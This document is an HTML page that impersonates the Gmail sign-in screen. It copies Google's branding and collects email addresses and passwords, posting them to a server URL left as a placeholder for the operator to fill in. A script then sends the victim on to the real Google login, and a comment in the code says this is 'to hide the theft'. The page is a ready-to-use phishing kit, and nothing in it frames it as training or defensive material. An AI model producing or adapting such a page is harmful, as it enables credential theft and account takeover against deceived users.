<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Gmail</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #202124;
        }

        .container {
            width: 100%;
            max-width: 450px;
            text-align: center;
            padding: 20px;
        }

        .logo {
            margin-bottom: 10px;
        }

        .logo img {
            height: 28px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 16px 0 5px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-label {
            display: block;
            font-size: 16px;
            margin-bottom: 8px;
            color: #202124;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 1px 2px rgba(32, 33, 36, 0.28);
        }

        .btn-row {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
            margin-bottom: 24px;
        }

        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .btn-primary {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
        }

        .btn-primary:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px rgba(66, 133, 244, 0.3);
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Optional: Hide the real submit button if you want to use JS */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Gmail Logo -->
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Gmail_icon_%282020%29.svg" alt="Gmail Logo">
        </div>

        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <!-- FORM: Change action to your server URL -->
        <form id="loginForm" action="YOUR_SERVER_URL_HERE" method="POST">
            <!-- HIDDEN FIELD: Captures the email -->
            <input type="hidden" name="email" id="emailInput" value="">

            <div class="input-group">
                <label class="input-label" for="email">Email or phone</label>
                <input type="email" id="emailField" name="email" placeholder="amar@gmail.com" required>
            </div>

            <div class="input-group">
                <label class="input-label" for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>

            <div class="btn-row">
                <a href="#" class="link">Forgot email?</a>
                <a href="#" class="link">Forgot password?</a>
            </div>

            <button type="submit" class="btn-primary">Next</button>
        </form>

        <div class="footer">
            <span>Not your computer? Use Guest mode to sign in privately.</span>
            <br>
            <a href="#">Learn more</a>
        </div>
    </div>

    <script>
        // Optional: Copy the email field value to the hidden field
        // This is useful if your backend expects a specific field name
        const emailField = document.getElementById('emailField');
        const hiddenEmail = document.getElementById('emailInput');

        emailField.addEventListener('input', function() {
            hiddenEmail.value = this.value;
        });

        // Example: Redirect to real Gmail after 2 seconds (to hide the theft)
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // If you want to hide the redirect, comment out the next line:
            // e.preventDefault(); 
            
            // After form submits, redirect to real Gmail
            setTimeout(() => {
                window.location.href = "https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://mail.google.com/";
            }, 1500);
        });
    </script>

</body>
</html>
